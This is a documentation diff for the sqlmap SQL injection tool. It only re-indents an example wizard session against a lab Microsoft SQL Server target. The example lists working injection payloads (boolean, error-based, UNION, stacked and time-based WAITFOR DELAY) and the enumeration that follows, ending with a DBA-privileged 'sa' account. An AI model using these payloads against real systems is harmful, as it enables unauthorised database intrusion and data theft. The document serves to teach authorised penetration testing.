@@ -1939,74 +1939,74 @@ For beginner users there is a wizard interface which uses a simple workflow with
 
 Example against a Microsoft SQL Server target:
 
-        $ python sqlmap.py --wizard
+    $ python sqlmap.py --wizard
 
-            sqlmap/1.0-dev-2defc30 - automatic SQL injection and database takeover tool
-            http://sqlmap.org
+        sqlmap/1.0-dev-2defc30 - automatic SQL injection and database takeover tool
+        http://sqlmap.org
 
-        [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-        [*] starting at 11:25:26
+    [*] starting at 11:25:26
 
-        Please enter full target URL (-u): http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1
-        POST data (--data) [Enter for None]: 
-        Injection difficulty (--level/--risk). Please choose:
-        [1] Normal (default)
-        [2] Medium
-        [3] Hard
-        > 1
-        Enumeration (--banner/--current-user/etc). Please choose:
-        [1] Basic (default)
-        [2] Smart
-        [3] All
-        > 1
+    Please enter full target URL (-u): http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1
+    POST data (--data) [Enter for None]: 
+    Injection difficulty (--level/--risk). Please choose:
+    [1] Normal (default)
+    [2] Medium
+    [3] Hard
+    > 1
+    Enumeration (--banner/--current-user/etc). Please choose:
+    [1] Basic (default)
+    [2] Smart
+    [3] All
+    > 1
 
-        sqlmap is running, please wait..
+    sqlmap is running, please wait..
 
-        heuristic (parsing) test showed that the back-end DBMS could be 'Microsoft SQL Server'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
-        do you want to include all tests for 'Microsoft SQL Server' extending provided level (1) and risk (1)? [Y/n] Y
-        GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N                                                                                                                                                  
-        sqlmap identified the following injection points with a total of 25 HTTP(s) requests:
-        ---
-        Place: GET
-        Parameter: id
-            Type: boolean-based blind
-            Title: AND boolean-based blind - WHERE or HAVING clause
-            Payload: id=1 AND 2986=2986
+    heuristic (parsing) test showed that the back-end DBMS could be 'Microsoft SQL Server'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+    do you want to include all tests for 'Microsoft SQL Server' extending provided level (1) and risk (1)? [Y/n] Y
+    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N                                                                                                                                                  
+    sqlmap identified the following injection points with a total of 25 HTTP(s) requests:
+    ---
+    Place: GET
+    Parameter: id
+        Type: boolean-based blind
+        Title: AND boolean-based blind - WHERE or HAVING clause
+        Payload: id=1 AND 2986=2986
 
-            Type: error-based
-            Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
-            Payload: id=1 AND 4847=CONVERT(INT,(CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) (SELECT (CASE WHEN (4847=4847) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(111) CHAR(109) CHAR(113) CHAR(58)))
+        Type: error-based
+        Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause
+        Payload: id=1 AND 4847=CONVERT(INT,(CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) (SELECT (CASE WHEN (4847=4847) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(111) CHAR(109) CHAR(113) CHAR(58)))
 
-            Type: UNION query
-            Title: Generic UNION query (NULL) - 3 columns
-            Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) CHAR(70) CHAR(79) CHAR(118) CHAR(106) CHAR(87) CHAR(101) CHAR(119) CHAR(115) CHAR(114) CHAR(77) CHAR(58) CHAR(111) CHAR(109) CHAR(113) CHAR(58)-- 
+        Type: UNION query
+        Title: Generic UNION query (NULL) - 3 columns
+        Payload: id=1 UNION ALL SELECT NULL,NULL,CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) CHAR(70) CHAR(79) CHAR(118) CHAR(106) CHAR(87) CHAR(101) CHAR(119) CHAR(115) CHAR(114) CHAR(77) CHAR(58) CHAR(111) CHAR(109) CHAR(113) CHAR(58)-- 
 
-            Type: stacked queries
-            Title: Microsoft SQL Server/Sybase stacked queries
-            Payload: id=1; WAITFOR DELAY '0:0:5'--
+        Type: stacked queries
+        Title: Microsoft SQL Server/Sybase stacked queries
+        Payload: id=1; WAITFOR DELAY '0:0:5'--
 
-            Type: AND/OR time-based blind
-            Title: Microsoft SQL Server/Sybase time-based blind
-            Payload: id=1 WAITFOR DELAY '0:0:5'--
+        Type: AND/OR time-based blind
+        Title: Microsoft SQL Server/Sybase time-based blind
+        Payload: id=1 WAITFOR DELAY '0:0:5'--
 
-            Type: inline query
-            Title: Microsoft SQL Server/Sybase inline queries
-            Payload: id=(SELECT CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) (SELECT (CASE WHEN (6382=6382) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(111) CHAR(109) CHAR(113) CHAR(58))
-        ---
-        web server operating system: Windows XP
-        web application technology: ASP, Microsoft IIS 5.1
-        back-end DBMS operating system: Windows XP Service Pack 2
-        back-end DBMS: Microsoft SQL Server 2005
-        banner:
-        ---
-        Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) 
-            Oct 14 2005 00:33:37 
-            Copyright (c) 1988-2005 Microsoft Corporation
-            Express Edition on Windows NT 5.1 (Build 2600: Service Pack 2)
-        ---
-        current user:    'sa'
-        current database:    'testdb'
-        current user is DBA:    True
+        Type: inline query
+        Title: Microsoft SQL Server/Sybase inline queries
+        Payload: id=(SELECT CHAR(58) CHAR(118) CHAR(114) CHAR(100) CHAR(58) (SELECT (CASE WHEN (6382=6382) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(111) CHAR(109) CHAR(113) CHAR(58))
+    ---
+    web server operating system: Windows XP
+    web application technology: ASP, Microsoft IIS 5.1
+    back-end DBMS operating system: Windows XP Service Pack 2
+    back-end DBMS: Microsoft SQL Server 2005
+    banner:
+    ---
+    Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) 
+        Oct 14 2005 00:33:37 
+        Copyright (c) 1988-2005 Microsoft Corporation
+        Express Edition on Windows NT 5.1 (Build 2600: Service Pack 2)
+    ---
+    current user:    'sa'
+    current database:    'testdb'
+    current user is DBA:    True
 
-        [*] shutting down at 11:25:52
+    [*] shutting down at 11:25:52
